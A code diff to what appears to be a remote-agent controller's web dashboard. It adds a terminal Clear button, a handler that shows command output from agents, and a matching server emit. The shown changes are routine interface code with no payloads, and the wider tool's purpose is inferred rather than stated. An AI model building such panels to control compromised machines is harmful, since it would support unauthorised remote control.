@@ -1821,7 +1821,10 @@ DASHBOARD_HTML = r'''
             <div class="metric-pill"><div class="v" id="m4">45ms</div><div class="small muted">Response Time</div></div>
           </div>
 
-          <div style="margin-top:12px;font-weight:700">Output</div>
+          <div style="margin-top:12px;display:flex;justify-content:space-between;align-items:center">
+            <div style="font-weight:700">Output</div>
+            <button class="control-btn secondary" onclick="clearTerminal()" style="padding:4px 8px;font-size:12px">Clear</button>
+          </div>
           <div class="terminal" id="output-terminal">NEURAL_TERMINAL_v2.1 &gt; Waiting for events...</div>
         </div>
       </div>
@@ -1872,6 +1875,14 @@ DASHBOARD_HTML = r'''
     appendLog(data);
   });
 
+  socket.on('command_output', data => {
+    if (data.agent_id && data.output) {
+      const timestamp = new Date().toLocaleTimeString();
+      const outputText = `[${timestamp}] Agent ${data.agent_id.substring(0,8)}: ${data.output}`;
+      appendLog(outputText);
+    }
+  });
+
   socket.on('config_status', data => {
     document.getElementById('cfg-time').innerText = new Date().toLocaleTimeString();
     document.getElementById('cfg1').innerText = data.admin_password_set ? 'Yes':'No';
@@ -1882,7 +1893,12 @@ DASHBOARD_HTML = r'''
   /* --------- Render helpers --------- */
   function appendLog(msg){
     const el = document.getElementById('output-terminal');
-    el.innerText = (new Date().toLocaleTimeString()) + ' > ' + msg + '\\n' + el.innerText;
+    const timestamp = new Date().toLocaleTimeString();
+    const newLine = `[${timestamp}] ${msg}`;
+    el.innerText = newLine + '\\n' + el.innerText;
+    
+    // Auto-scroll to top to show latest output
+    el.scrollTop = 0;
   }
   function renderAgentList(list){
     const container = document.getElementById('agent-list');
@@ -1899,7 +1915,15 @@ DASHBOARD_HTML = r'''
       container.appendChild(item);
     });
   }
-  function selectAgent(id){ document.getElementById('agent-id')?.setAttribute('value', id); appendLog('Selected agent '+id); }
+  function selectAgent(id){ 
+    document.getElementById('agent-id')?.setAttribute('value', id); 
+    appendLog('Selected agent '+id); 
+  }
+
+  function clearTerminal(){
+    const el = document.getElementById('output-terminal');
+    el.innerText = 'NEURAL_TERMINAL_v2.1 > Terminal cleared. Waiting for events...';
+  }
 
   /* --------- Chart.js: doughnuts + trend --------- */
   const doughnutOpts = {responsive:true, maintainAspectRatio:false, cutout:'70%', plugins:{legend:{display:false}}};
@@ -4137,6 +4161,8 @@ def handle_command_result(data):
     
     print(f"🔍 Controller: Broadcasting to operators room: {result_data}")
     emit('command_result', result_data, room='operators', broadcast=True)
+    # Also emit command_output for compatibility with frontend
+    emit('command_output', {'agent_id': agent_id, 'output': output}, room='operators', broadcast=True)
     print(f"🔍 Controller: Command result broadcasted successfully")
     
     # Log activity
